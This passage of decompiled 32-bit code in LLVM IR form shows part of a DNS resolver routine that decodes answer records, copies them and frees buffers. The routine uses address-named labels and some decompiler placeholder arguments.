  store i32 12, i32* @esi, align 4
  %v2_804f08855 = add i32 %v0_804efc8, 116
  %v3_804f08856 = inttoptr i32 %v2_804f08855 to i32*
  %v4_804f08857 = load i32, i32* %v3_804f08856, align 4
  %v5_804f08858 = sub i32 0, %v4_804f08857
  %v13_804f08862 = and i32 %v4_804f08857, %v5_804f08858
  %v14_804f08863 = icmp slt i32 %v13_804f08862, 0
  %v16_804f08865 = icmp slt i32 %v5_804f08858, 0
  %v2_804f08c66 = icmp eq i1 %v16_804f08865, %v14_804f08863
  br i1 %v2_804f08c66, label %dec_label_pc_804f08e, label %dec_label_pc_804f079

dec_label_pc_804f069:                             ; preds = %dec_label_pc_804f059
  %v0_804f069 = call i32 @__GI___h_errno_location()
  store i32 %v0_804f069, i32* %eax.global-to-local, align 4
  %v1_804f06e = inttoptr i32 %v0_804f069 to i32*
  store i32 4, i32* %v1_804f06e, align 4
  br label %dec_label_pc_804f304

dec_label_pc_804f079:                             ; preds = %dec_label_pc_804f060, %dec_label_pc_804f079
  %v0_804f09068 = phi i32 [ %v1_804f085, %dec_label_pc_804f079 ], [ %v1_804efc8, %dec_label_pc_804f060 ]
  %v0_804f07967 = phi i32 [ %v0_804f07d, %dec_label_pc_804f079 ], [ %v3_804efe2, %dec_label_pc_804f060 ]
  %v2_804f079 = add i32 %v0_804f09068, -4
  %v3_804f079 = inttoptr i32 %v2_804f079 to i32*
  store i32 %v0_804f07967, i32* %v3_804f079, align 4
  %v0_804f07a = load i32, i32* @eax, align 4
  %v2_804f07a = add i32 %v0_804f09068, -8
  %v3_804f07a = inttoptr i32 %v2_804f07a to i32*
  store i32 %v0_804f07a, i32* %v3_804f07a, align 4
  %v0_804f07b = load i32, i32* @esi, align 4
  %v2_804f07b = add i32 %v0_804f09068, -12
  %v3_804f07b = inttoptr i32 %v2_804f07b to i32*
  store i32 %v0_804f07b, i32* %v3_804f07b, align 4
  %v2_804f07c = add i32 %v0_804f09068, -16
  %v3_804f07c = inttoptr i32 %v2_804f07c to i32*
  store i32 %v2_804ec5e, i32* %v3_804f07c, align 4
  %v0_804f07d = call i32 @__length_question()
  store i32 %v0_804f07d, i32* @eax, align 4
  %v0_804f082 = load i32, i32* @ebx, align 4
  %v1_804f082 = add i32 %v0_804f082, 1
  store i32 %v1_804f082, i32* @ebx, align 4
  %v0_804f083 = load i32, i32* @esi, align 4
  %v2_804f083 = add i32 %v0_804f083, %v0_804f07d
  store i32 %v2_804f083, i32* @esi, align 4
  %v0_804f085 = load i32, i32* @esp, align 4
  %v1_804f085 = add i32 %v0_804f085, 16
  %v2_804f088 = add i32 %v0_804f085, 116
  %v3_804f088 = inttoptr i32 %v2_804f088 to i32*
  %v4_804f088 = load i32, i32* %v3_804f088, align 4
  %v5_804f088 = sub i32 %v1_804f082, %v4_804f088
  %v11_804f088 = xor i32 %v4_804f088, %v1_804f082
  %v12_804f088 = xor i32 %v5_804f088, %v1_804f082
  %v13_804f088 = and i32 %v12_804f088, %v11_804f088
  %v14_804f088 = icmp slt i32 %v13_804f088, 0
  %v16_804f088 = icmp slt i32 %v5_804f088, 0
  %v2_804f08c = icmp eq i1 %v16_804f088, %v14_804f088
  br i1 %v2_804f08c, label %dec_label_pc_804f08e, label %dec_label_pc_804f079

dec_label_pc_804f08e:                             ; preds = %dec_label_pc_804f079, %dec_label_pc_804f060
  %v0_804f090.lcssa = phi i32 [ %v1_804efc8, %dec_label_pc_804f060 ], [ %v1_804f085, %dec_label_pc_804f079 ]
  store i32 0, i32* @ebx, align 4
  %v1_804f090 = add i32 %v0_804f090.lcssa, 27
  %v2_804f090 = inttoptr i32 %v1_804f090 to i8*
  store i8 1, i8* %v2_804f090, align 1
  %v0_804f1be.pre = load i32, i32* @ebx, align 4
  %v1_804f1be.pre = load i32, i32* @esp, align 4
  %v2_804f1be69 = add i32 %v1_804f1be.pre, 104
  %v3_804f1be70 = inttoptr i32 %v2_804f1be69 to i32*
  %v4_804f1be71 = load i32, i32* %v3_804f1be70, align 4
  %v5_804f1be72 = sub i32 %v0_804f1be.pre, %v4_804f1be71
  %v11_804f1be74 = xor i32 %v4_804f1be71, %v0_804f1be.pre
  %v12_804f1be75 = xor i32 %v5_804f1be72, %v0_804f1be.pre
  %v13_804f1be76 = and i32 %v12_804f1be75, %v11_804f1be74
  %v14_804f1be77 = icmp slt i32 %v13_804f1be76, 0
  %v16_804f1be79 = icmp slt i32 %v5_804f1be72, 0
  %v2_804f1c280 = icmp eq i1 %v16_804f1be79, %v14_804f1be77
  br i1 %v2_804f1c280, label %dec_label_pc_804f1ce, label %dec_label_pc_804f1c4.lr.ph

dec_label_pc_804f1c4.lr.ph:                       ; preds = %dec_label_pc_804f08e
  %v0_804f1c4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f1c4

dec_label_pc_804f09a:                             ; preds = %dec_label_pc_804f1c4
  %v1_804f09a = add i32 %v0_804f09a81, 116
  store i32 %v1_804f09a, i32* %eax.global-to-local, align 4
  %v2_804f09e = add i32 %v0_804f09a81, -4
  %v3_804f09e = inttoptr i32 %v2_804f09e to i32*
  store i32 %v1_804f09a, i32* %v3_804f09e, align 4
  %v3_804f09f = load i32, i32* %v3_804f1c4, align 4
  %v5_804f09f = add i32 %v0_804f09a81, -8
  %v6_804f09f = inttoptr i32 %v5_804f09f to i32*
  store i32 %v3_804f09f, i32* %v6_804f09f, align 4
  %v0_804f0a3 = load i32, i32* @esi, align 4
  %v2_804f0a3 = add i32 %v0_804f09a81, -12
  %v3_804f0a3 = inttoptr i32 %v2_804f0a3 to i32*
  store i32 %v0_804f0a3, i32* %v3_804f0a3, align 4
  %v2_804f0a4 = add i32 %v0_804f09a81, -16
  %v3_804f0a4 = inttoptr i32 %v2_804f0a4 to i32*
  store i32 %v2_804ec5e, i32* %v3_804f0a4, align 4
  %v0_804f0a5 = call i32 @__decode_answer()
  store i32 %v0_804f0a5, i32* @eax, align 4
  %v1_804f0aa = load i32, i32* @esp, align 4
  %v2_804f0aa = add i32 %v1_804f0aa, 68
  %v3_804f0aa = inttoptr i32 %v2_804f0aa to i32*
  store i32 %v0_804f0a5, i32* %v3_804f0aa, align 4
  %v0_804f0ae = load i32, i32* @esp, align 4
  %v1_804f0ae = add i32 %v0_804f0ae, 16
  %v2_804f0b1 = icmp slt i32 %v0_804f0a5, 0
  %v1_804f0b3 = icmp eq i1 %v2_804f0b1, false
  br i1 %v1_804f0b3, label %dec_label_pc_804f0cd, label %dec_label_pc_804f0b5

dec_label_pc_804f0b5:                             ; preds = %dec_label_pc_804f09a
  %v0_804f0b5 = load i32, i32* @ebx, align 4
  %v1_804f0b5 = icmp eq i32 %v0_804f0b5, 0
  br i1 %v1_804f0b5, label %dec_label_pc_804f260, label %dec_label_pc_804f0bd

dec_label_pc_804f0bd:                             ; preds = %dec_label_pc_804f0b5
  %v1_804f0bd = add i32 %v0_804f0ae, 100
  %v2_804f0bd = inttoptr i32 %v1_804f0bd to i32*
  %v3_804f0bd = load i32, i32* %v2_804f0bd, align 4
  %v4_804f0bd = icmp eq i32 %v3_804f0bd, 0
  br i1 %v4_804f0bd, label %dec_label_pc_804f260, label %dec_label_pc_804f1ce

dec_label_pc_804f0cd:                             ; preds = %dec_label_pc_804f09a
  %v1_804f0cd = add i32 %v0_804f0ae, 43
  %v2_804f0cd = inttoptr i32 %v1_804f0cd to i8*
  %v3_804f0cd = load i8, i8* %v2_804f0cd, align 1
  %v4_804f0cd = icmp eq i8 %v3_804f0cd, 0
  br i1 %v4_804f0cd, label %dec_label_pc_804f16e, label %dec_label_pc_804f0d8

dec_label_pc_804f0d8:                             ; preds = %dec_label_pc_804f0cd
  %v0_804f0d8 = load i32, i32* @edi, align 4
  %v1_804f0d8 = add i32 %v0_804f0d8, 28
  %v2_804f0d8 = inttoptr i32 %v1_804f0d8 to i32*
  %v3_804f0d8 = load i32, i32* %v2_804f0d8, align 4
  store i32 %v3_804f0d8, i32* %eax.global-to-local, align 4
  %v2_804f0db = add i32 %v0_804f0ae, 160
  %v3_804f0db = inttoptr i32 %v2_804f0db to i32*
  store i32 %v3_804f0d8, i32* %v3_804f0db, align 4
  %v0_804f0e2 = load i32, i32* @edi, align 4
  %v1_804f0e2 = add i32 %v0_804f0e2, 32
  %v2_804f0e2 = inttoptr i32 %v1_804f0e2 to i32*
  %v3_804f0e2 = load i32, i32* %v2_804f0e2, align 4
  store i32 %v3_804f0e2, i32* %eax.global-to-local, align 4
  %v1_804f0e5 = load i32, i32* @esp, align 4
  %v2_804f0e5 = add i32 %v1_804f0e5, 148
  %v3_804f0e5 = inttoptr i32 %v2_804f0e5 to i32*
  store i32 %v3_804f0e2, i32* %v3_804f0e5, align 4
  %v0_804f0ec = load i32, i32* @edi, align 4
  %v1_804f0ec = add i32 %v0_804f0ec, 36
  %v2_804f0ec = inttoptr i32 %v1_804f0ec to i32*
  %v3_804f0ec = load i32, i32* %v2_804f0ec, align 4
  store i32 %v3_804f0ec, i32* %eax.global-to-local, align 4
  %v1_804f0ef = load i32, i32* @esp, align 4
  %v2_804f0ef = add i32 %v1_804f0ef, 152
  %v3_804f0ef = inttoptr i32 %v2_804f0ef to i32*
  store i32 %v3_804f0ec, i32* %v3_804f0ef, align 4
  %v0_804f0f6 = load i32, i32* @ecx, align 4
  %v1_804f0f6 = load i32, i32* @esp, align 4
  %v2_804f0f6 = add i32 %v1_804f0f6, -4
  %v3_804f0f6 = inttoptr i32 %v2_804f0f6 to i32*
  store i32 %v0_804f0f6, i32* %v3_804f0f6, align 4
  %v1_804f0f7 = add i32 %v1_804f0f6, -8
  %v2_804f0f7 = inttoptr i32 %v1_804f0f7 to i32*
  store i32 40, i32* %v2_804f0f7, align 4
  %v1_804f0f9 = add i32 %v1_804f0f6, 116
  store i32 %v1_804f0f9, i32* %edx.global-to-local, align 4
  %v2_804f0fd = add i32 %v1_804f0f6, -12
  %v3_804f0fd = inttoptr i32 %v2_804f0fd to i32*
  store i32 %v1_804f0f9, i32* %v3_804f0fd, align 4
  %v0_804f0fe = load i32, i32* @edi, align 4
  %v2_804f0fe = add i32 %v1_804f0f6, -16
  %v3_804f0fe = inttoptr i32 %v2_804f0fe to i32*
  store i32 %v0_804f0fe, i32* %v3_804f0fe, align 4
  %v5_804f0ff = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804ecec, i32 %v3_804ed4b)
  store i32 %v5_804f0ff, i32* %eax.global-to-local, align 4
  %v0_804f104 = load i32, i32* @edi, align 4
  %v1_804f104 = add i32 %v0_804f104, 4
  %v2_804f104 = inttoptr i32 %v1_804f104 to i32*
  %v3_804f104 = load i32, i32* %v2_804f104, align 4
  store i32 %v3_804f104, i32* %eax.global-to-local, align 4
  %v0_804f107 = load i32, i32* @esp, align 4
  %v1_804f107 = add i32 %v0_804f107, 16
  %v9_804f10a = icmp eq i32 %v3_804f104, 24
  br i1 %v9_804f10a, label %dec_label_pc_804f0d8.dec_label_pc_804f131_crit_edge, label %dec_label_pc_804f10f

dec_label_pc_804f0d8.dec_label_pc_804f131_crit_edge: ; preds = %dec_label_pc_804f0d8
  %.pre24 = add i32 %v0_804f107, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_804f131.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_804f131

dec_label_pc_804f10f:                             ; preds = %dec_label_pc_804f0d8
  %v1_804f10f = add i32 %v0_804f104, 28
  %v2_804f10f = inttoptr i32 %v1_804f10f to i32*
  %v3_804f10f = load i32, i32* %v2_804f10f, align 4
  %v4_804f10f = icmp eq i32 %v3_804f10f, 0
  br i1 %v4_804f10f, label %dec_label_pc_804f1ce, label %dec_label_pc_804f119

dec_label_pc_804f119:                             ; preds = %dec_label_pc_804f10f
  %v1_804f119 = add i32 %v0_804f107, 260
  %v2_804f119 = inttoptr i32 %v1_804f119 to i32*
  %v3_804f119 = load i32, i32* %v2_804f119, align 4
  %v12_804f119 = icmp eq i32 %v3_804f119, 1
  br i1 %v12_804f119, label %dec_label_pc_804f131, label %dec_label_pc_804f123

dec_label_pc_804f123:                             ; preds = %dec_label_pc_804f119
  %v12_804f123 = icmp eq i32 %v3_804f119, 28
  %v1_804f12b = icmp eq i1 %v12_804f123, false
  br i1 %v1_804f12b, label %dec_label_pc_804f1ce, label %dec_label_pc_804f131

dec_label_pc_804f131:                             ; preds = %dec_label_pc_804f0d8.dec_label_pc_804f131_crit_edge, %dec_label_pc_804f123, %dec_label_pc_804f119
  %v4_804f131 = phi i32 [ %v4_804f131.pre, %dec_label_pc_804f0d8.dec_label_pc_804f131_crit_edge ], [ %v3_804f119, %dec_label_pc_804f123 ], [ 1, %dec_label_pc_804f119 ]
  %v15_804f131 = icmp eq i32 %v3_804f104, %v4_804f131
  br i1 %v15_804f131, label %dec_label_pc_804f146, label %dec_label_pc_804f13a

dec_label_pc_804f13a:                             ; preds = %dec_label_pc_804f131
  %v1_804f13d = inttoptr i32 %v0_804f104 to i32*
  %v2_804f13d = load i32, i32* %v1_804f13d, align 4
  %v5_804f13d = inttoptr i32 %v0_804f107 to i32*
  store i32 %v2_804f13d, i32* %v5_804f13d, align 4
  %v1_804f13f = call i32 @free(i32 -1)
  store i32 %v1_804f13f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f1b6

dec_label_pc_804f146:                             ; preds = %dec_label_pc_804f131
  %v0_804f146 = load i32, i32* @ebx, align 4
  %v1_804f148 = sub i32 -1, %v0_804f146
  store i32 %v1_804f148, i32* %eax.global-to-local, align 4
  %v2_804f14a = add i32 %v0_804f107, 120
  %v3_804f14a = inttoptr i32 %v2_804f14a to i32*
  %v4_804f14a = load i32, i32* %v3_804f14a, align 4
  %v5_804f14a = add i32 %v4_804f14a, %v1_804f148
  store i32 %v5_804f14a, i32* %eax.global-to-local, align 4
  %v2_804f14e = add i32 %v0_804f104, 36
  %v3_804f14e = inttoptr i32 %v2_804f14e to i32*
  store i32 %v5_804f14a, i32* %v3_804f14e, align 4
  %v0_804f151 = load i32, i32* @edi, align 4
  %v1_804f151 = add i32 %v0_804f151, 16
  %v2_804f151 = inttoptr i32 %v1_804f151 to i32*
  %v3_804f151 = load i32, i32* %v2_804f151, align 4
  %v1_804f154 = add i32 %v3_804f151, 4
  store i32 %v1_804f154, i32* %eax.global-to-local, align 4
  %v2_804f157 = add i32 %v0_804f151, 36
  %v3_804f157 = inttoptr i32 %v2_804f157 to i32*
  %v4_804f157 = load i32, i32* %v3_804f157, align 4
  %v7_804f157 = mul i32 %v4_804f157, %v1_804f154
  store i32 %v7_804f157, i32* %eax.global-to-local, align 4
  %v2_804f15b = add i32 %v0_804f151, 32
  %v3_804f15b = inttoptr i32 %v2_804f15b to i32*
  %v4_804f15b = load i32, i32* %v3_804f15b, align 4
  %v6_804f15e = icmp ugt i32 %v7_804f157, %v4_804f15b
  br i1 %v6_804f15e, label %dec_label_pc_804f146.dec_label_pc_804f1ce.loopexit_crit_edge, label %dec_label_pc_804f160

dec_label_pc_804f146.dec_label_pc_804f1ce.loopexit_crit_edge: ; preds = %dec_label_pc_804f146
  %v0_804f1ce.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f1ce

dec_label_pc_804f160:                             ; preds = %dec_label_pc_804f146
  store i32 0, i32* %v3_804f157, align 4
  %v0_804f167 = load i32, i32* @esp, align 4
  %v1_804f167 = add i32 %v0_804f167, 27
  %v2_804f167 = inttoptr i32 %v1_804f167 to i8*
  store i8 0, i8* %v2_804f167, align 1
  %v1_804f1b9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f1b9

dec_label_pc_804f16e:                             ; preds = %dec_label_pc_804f0cd
  %v1_804f171 = add i32 %v0_804f0ae, 132
  %v2_804f171 = inttoptr i32 %v1_804f171 to i32*
  %v3_804f171 = load i32, i32* %v2_804f171, align 4
  %v6_804f171 = inttoptr i32 %v0_804f0ae to i32*
  store i32 %v3_804f171, i32* %v6_804f171, align 4
  %v1_804f178 = call i32 @free(i32 -1)
  store i32 %v1_804f178, i32* %eax.global-to-local, align 4
  %v0_804f17d = load i32, i32* @esp, align 4
  %v1_804f17d = add i32 %v0_804f17d, 16
  %v1_804f180 = add i32 %v0_804f17d, 260
  %v2_804f180 = inttoptr i32 %v1_804f180 to i32*
  %v3_804f180 = load i32, i32* %v2_804f180, align 4
  store i32 %v3_804f180, i32* %eax.global-to-local, align 4
  %v1_804f187 = add i32 %v0_804f17d, 136
  %v2_804f187 = inttoptr i32 %v1_804f187 to i32*
  %v3_804f187 = load i32, i32* %v2_804f187, align 4
  %v15_804f187 = icmp eq i32 %v3_804f187, %v3_804f180
  %v1_804f18b = icmp eq i1 %v15_804f187, false
  br i1 %v1_804f18b, label %dec_label_pc_804f1b9, label %dec_label_pc_804f18d

dec_label_pc_804f18d:                             ; preds = %dec_label_pc_804f16e
  %v0_804f18d = load i32, i32* @edi, align 4
  %v1_804f18d = add i32 %v0_804f18d, 16
  %v2_804f18d = inttoptr i32 %v1_804f18d to i32*
  %v3_804f18d = load i32, i32* %v2_804f18d, align 4
  store i32 %v3_804f18d, i32* %eax.global-to-local, align 4
  %v2_804f190 = add i32 %v0_804f17d, 148
  %v3_804f190 = inttoptr i32 %v2_804f190 to i32*
  %v4_804f190 = load i32, i32* %v3_804f190, align 4
  %v15_804f190 = icmp eq i32 %v3_804f18d, %v4_804f190
  %v1_804f197 = icmp eq i1 %v15_804f190, false
  br i1 %v1_804f197, label %dec_label_pc_804f253, label %dec_label_pc_804f19d

dec_label_pc_804f19d:                             ; preds = %dec_label_pc_804f18d
  %v0_804f19d = load i32, i32* @edx, align 4
  %v2_804f19d = add i32 %v0_804f17d, 12
  %v3_804f19d = inttoptr i32 %v2_804f19d to i32*
  store i32 %v0_804f19d, i32* %v3_804f19d, align 4
  %v0_804f19e = load i32, i32* %eax.global-to-local, align 4
  %v2_804f19e = add i32 %v0_804f17d, 8
  %v3_804f19e = inttoptr i32 %v2_804f19e to i32*
  store i32 %v0_804f19e, i32* %v3_804f19e, align 4
  %v1_804f19f = add i32 %v0_804f17d, 152
  %v2_804f19f = inttoptr i32 %v1_804f19f to i32*
  %v3_804f19f = load i32, i32* %v2_804f19f, align 4
  %v5_804f19f = add i32 %v0_804f17d, 4
  %v6_804f19f = inttoptr i32 %v5_804f19f to i32*
  store i32 %v3_804f19f, i32* %v6_804f19f, align 4
  %v0_804f1a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f1a6 = load i32, i32* @edi, align 4
  %v2_804f1a6 = add i32 %v1_804f1a6, 36
  %v3_804f1a6 = inttoptr i32 %v2_804f1a6 to i32*
  %v4_804f1a6 = load i32, i32* %v3_804f1a6, align 4
  %v7_804f1a6 = mul i32 %v4_804f1a6, %v0_804f1a6
  store i32 %v7_804f1a6, i32* %eax.global-to-local, align 4
  %v2_804f1aa = add i32 %v1_804f1a6, 28
  %v3_804f1aa = inttoptr i32 %v2_804f1aa to i32*
  %v4_804f1aa = load i32, i32* %v3_804f1aa, align 4
  %v5_804f1aa = add i32 %v4_804f1aa, %v7_804f1a6
  store i32 %v5_804f1aa, i32* %eax.global-to-local, align 4
  %v3_804f1ad = inttoptr i32 %v0_804f17d to i32*
  store i32 %v5_804f1aa, i32* %v3_804f1ad, align 4
  %v5_804f1ae = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804ecec, i32 %v3_804ed4b)
  store i32 %v5_804f1ae, i32* %eax.global-to-local, align 4
  %v0_804f1b3 = load i32, i32* @edi, align 4
  %v1_804f1b3 = add i32 %v0_804f1b3, 36
  %v2_804f1b3 = inttoptr i32 %v1_804f1b3 to i32*
  %v3_804f1b3 = load i32, i32* %v2_804f1b3, align 4
  %v4_804f1b3 = add i32 %v3_804f1b3, 1
  store i32 %v4_804f1b3, i32* %v2_804f1b3, align 4
  br label %dec_label_pc_804f1b6

dec_label_pc_804f1b6:                             ; preds = %dec_label_pc_804f13a, %dec_label_pc_804f19d
  %v0_804f1b6 = load i32, i32* @esp, align 4
  %v1_804f1b6 = add i32 %v0_804f1b6, 16
  br label %dec_label_pc_804f1b9

dec_label_pc_804f1b9:                             ; preds = %dec_label_pc_804f16e, %dec_label_pc_804f160, %dec_label_pc_804f1b6
  %v1_804f1b9 = phi i32 [ %v1_804f17d, %dec_label_pc_804f16e ], [ %v1_804f1b9.pre, %dec_label_pc_804f160 ], [ %v1_804f1b6, %dec_label_pc_804f1b6 ]
  %v0_804f1b9 = load i32, i32* @esi, align 4
  %v2_804f1b9 = add i32 %v1_804f1b9, 52
  %v3_804f1b9 = inttoptr i32 %v2_804f1b9 to i32*
  %v4_804f1b9 = load i32, i32* %v3_804f1b9, align 4
  %v5_804f1b9 = add i32 %v4_804f1b9, %v0_804f1b9
  store i32 %v5_804f1b9, i32* @esi, align 4
  %v0_804f1bd = load i32, i32* @ebx, align 4
  %v1_804f1bd = add i32 %v0_804f1bd, 1
  store i32 %v1_804f1bd, i32* @ebx, align 4
  %v2_804f1be = add i32 %v1_804f1b9, 104
  %v3_804f1be = inttoptr i32 %v2_804f1be to i32*
  %v4_804f1be = load i32, i32* %v3_804f1be, align 4
  %v5_804f1be = sub i32 %v1_804f1bd, %v4_804f1be
  %v11_804f1be = xor i32 %v4_804f1be, %v1_804f1bd
  %v12_804f1be = xor i32 %v5_804f1be, %v1_804f1bd
  %v13_804f1be = and i32 %v12_804f1be, %v11_804f1be
  %v14_804f1be = icmp slt i32 %v13_804f1be, 0
  %v16_804f1be = icmp slt i32 %v5_804f1be, 0
  %v2_804f1c2 = icmp eq i1 %v16_804f1be, %v14_804f1be
  br i1 %v2_804f1c2, label %dec_label_pc_804f1ce, label %dec_label_pc_804f1c4

dec_label_pc_804f1c4:                             ; preds = %dec_label_pc_804f1c4.lr.ph, %dec_label_pc_804f1b9
  %v0_804f1c4 = phi i32 [ %v0_804f1c4.pre, %dec_label_pc_804f1c4.lr.ph ], [ %v5_804f1b9, %dec_label_pc_804f1b9 ]
  %v0_804f09a81 = phi i32 [ %v1_804f1be.pre, %dec_label_pc_804f1c4.lr.ph ], [ %v1_804f1b9, %dec_label_pc_804f1b9 ]
  %v2_804f1c4 = add i32 %v0_804f09a81, 16
  %v3_804f1c4 = inttoptr i32 %v2_804f1c4 to i32*
  %v4_804f1c4 = load i32, i32* %v3_804f1c4, align 4
  %v5_804f1c4 = sub i32 %v0_804f1c4, %v4_804f1c4
  %v11_804f1c4 = xor i32 %v4_804f1c4, %v0_804f1c4
  %v12_804f1c4 = xor i32 %v5_804f1c4, %v0_804f1c4
  %v13_804f1c4 = and i32 %v12_804f1c4, %v11_804f1c4
  %v14_804f1c4 = icmp slt i32 %v13_804f1c4, 0
  %v16_804f1c4 = icmp slt i32 %v5_804f1c4, 0
  %v2_804f1c8 = icmp eq i1 %v16_804f1c4, %v14_804f1c4
  br i1 %v2_804f1c8, label %dec_label_pc_804f1ce, label %dec_label_pc_804f09a

dec_label_pc_804f1ce:                             ; preds = %dec_label_pc_804f0bd, %dec_label_pc_804f08e, %dec_label_pc_804f1b9, %dec_label_pc_804f10f, %dec_label_pc_804f123, %dec_label_pc_804f1c4, %dec_label_pc_804f146.dec_label_pc_804f1ce.loopexit_crit_edge
  %v0_804f1ce = phi i32 [ %v0_804f1ce.pre.pre, %dec_label_pc_804f146.dec_label_pc_804f1ce.loopexit_crit_edge ], [ %v1_804f1be.pre, %dec_label_pc_804f08e ], [ %v1_804f1b9, %dec_label_pc_804f1b9 ], [ %v1_804f107, %dec_label_pc_804f10f ], [ %v1_804f107, %dec_label_pc_804f123 ], [ %v0_804f09a81, %dec_label_pc_804f1c4 ], [ %v1_804f0ae, %dec_label_pc_804f0bd ]
  %v1_804f1d1 = add i32 %v0_804f1ce, 20
  %v2_804f1d1 = inttoptr i32 %v1_804f1d1 to i32*
  %v3_804f1d1 = load i32, i32* %v2_804f1d1, align 4
  %v5_804f1d1 = add i32 %v0_804f1ce, -16
  %v6_804f1d1 = inttoptr i32 %v5_804f1d1 to i32*
  store i32 %v3_804f1d1, i32* %v6_804f1d1, align 4
  %v1_804f1d5 = call i32 @__libc_close(i32 -1)
  store i32 %v1_804f1d5, i32* %eax.global-to-local, align 4
  %v0_804f1da = load i32, i32* @esp, align 4
  %v1_804f1dd = add i32 %v0_804f1da, 272
  %v2_804f1dd = inttoptr i32 %v1_804f1dd to i32*
  %v3_804f1dd = load i32, i32* %v2_804f1dd, align 4
  %v4_804f1dd = icmp eq i32 %v3_804f1dd, 0
  br i1 %v4_804f1dd, label %dec_label_pc_804f1f2, label %dec_label_pc_804f1e7

dec_label_pc_804f1e7:                             ; preds = %dec_label_pc_804f1ce
  store i32 %v3_804f1dd, i32* %edx.global-to-local, align 4
  %v2_804f1ee = inttoptr i32 %v3_804f1dd to i32*
  store i32 %v2_804ec5e, i32* %v2_804f1ee, align 4
  %v0_804f1fe.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f1fe

dec_label_pc_804f1f2:                             ; preds = %dec_label_pc_804f1ce
  %v3_804f1f5 = inttoptr i32 %v0_804f1da to i32*
  store i32 %v2_804ec5e, i32* %v3_804f1f5, align 4
  %v1_804f1f6 = call i32 @free(i32 -1)
  store i32 %v1_804f1f6, i32* %eax.global-to-local, align 4
  %v0_804f1fb = load i32, i32* @esp, align 4
  %v1_804f1fb = add i32 %v0_804f1fb, 16
  br label %dec_label_pc_804f1fe

dec_label_pc_804f1fe:                             ; preds = %dec_label_pc_804f1e7, %dec_label_pc_804f1f2
  %v0_804f1fe = phi i32 [ %v0_804f1fe.pre, %dec_label_pc_804f1e7 ], [ %v1_804f1fb, %dec_label_pc_804f1f2 ]
  %v1_804f201 = add i32 %v0_804f1fe, 12
  %v2_804f201 = inttoptr i32 %v1_804f201 to i32*
  %v3_804f201 = load i32, i32* %v2_804f201, align 4
  %v5_804f201 = add i32 %v0_804f1fe, -16
  %v6_804f201 = inttoptr i32 %v5_804f201 to i32*
  store i32 %v3_804f201, i32* %v6_804f201, align 4
  %v1_804f205 = call i32 @free(i32 -1)
  store i32 %v1_804f205, i32* @eax, align 4
  %v0_804f20a = load i32, i32* @esp, align 4
  %v1_804f20d = add i32 %v0_804f20a, 8
  %v2_804f20d = inttoptr i32 %v1_804f20d to i32*
  store i32 ptrtoint (i8** @global_var_80569e8.398 to i32), i32* %v2_804f20d, align 4
  %v1_804f212 = add i32 %v0_804f20a, 4
  %v2_804f212 = inttoptr i32 %v1_804f212 to i32*
  store i32 134534955, i32* %v2_804f212, align 4
  %v1_804f217 = add i32 %v0_804f20a, 200
  store i32 %v1_804f217, i32* %ebx.global-to-local, align 4
  %v3_804f21e = inttoptr i32 %v0_804f20a to i32*
  store i32 %v1_804f217, i32* %v3_804f21e, align 4
  %v2_804f21f = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ecec)
  store i32 %v2_804f21f, i32* %eax.global-to-local, align 4
  %v0_804f224 = load i32, i32* @esp, align 4
  %v1_804f224 = inttoptr i32 %v0_804f224 to i32*
  store i32 ptrtoint (i8** @global_var_80569e8.398 to i32), i32* %v1_804f224, align 4
  %v1_804f22b = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804f22b, i32* %eax.global-to-local, align 4
  %v0_804f230 = load i32, i32* @esp, align 4
  %v1_804f230 = add i32 %v0_804f230, 56
  %v2_804f230 = inttoptr i32 %v1_804f230 to i32*
  %v3_804f230 = load i32, i32* %v2_804f230, align 4
  store i32 %v3_804f230, i32* @eax, align 4
  %v1_804f234 = add i32 %v0_804f230, 72
  %v2_804f234 = inttoptr i32 %v1_804f234 to i32*
  %v3_804f234 = load i32, i32* %v2_804f234, align 4
  store i32 %v3_804f234, i32* %edx.global-to-local, align 4
  %v1_804f238 = inttoptr i32 %v0_804f230 to i32*
  %v3_804f238 = add i32 %v0_804f230, 4
  %v1_804f239 = inttoptr i32 %v3_804f238 to i32*
  store i32 1, i32* %v1_804f239, align 4
  %v0_804f23c = load i32, i32* @eax, align 4
  %v1_804f23c = sext i32 %v0_804f23c to i64
  store i64 %v1_804f23c, i64* @global_var_8056a00.399, align 512
  %v0_804f241 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f241 = trunc i32 %v0_804f241 to i16
  store i16 %v1_804f241, i16* @global_var_805432c.400, align 4
  %v0_804f248 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f248, i32* %v1_804f238, align 4
  %v2_804f249 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ecec)
  store i32 %v2_804f249, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f38a

dec_label_pc_804f253:                             ; preds = %dec_label_pc_804f18d
  %v1_804f256 = inttoptr i32 %v0_804f18d to i32*
  %v2_804f256 = load i32, i32* %v1_804f256, align 4
  %v5_804f256 = inttoptr i32 %v0_804f17d to i32*
  store i32 %v2_804f256, i32* %v5_804f256, align 4
  %v1_804f258 = call i32 @free(i32 -1)
  store i32 %v1_804f258, i32* @eax, align 4
  %v0_804f25d = load i32, i32* @esp, align 4
  %v1_804f25d = add i32 %v0_804f25d, 16
  br label %dec_label_pc_804f260

dec_label_pc_804f260:                             ; preds = %dec_label_pc_804ef92, %dec_label_pc_804f0bd, %dec_label_pc_804f0b5, %dec_label_pc_804f051, %dec_label_pc_804efd7, %dec_label_pc_804efb3, %dec_label_pc_804f253
  %v1_804f267 = phi i32 [ %v1_804efa7, %dec_label_pc_804ef92 ], [ %v1_804f0ae, %dec_label_pc_804f0bd ], [ %v1_804f0ae, %dec_label_pc_804f0b5 ], [ %v1_804efc8, %dec_label_pc_804f051 ], [ %v1_804efc8, %dec_label_pc_804efd7 ], [ %v1_804efc8, %dec_label_pc_804efb3 ], [ %v1_804f25d, %dec_label_pc_804f253 ]
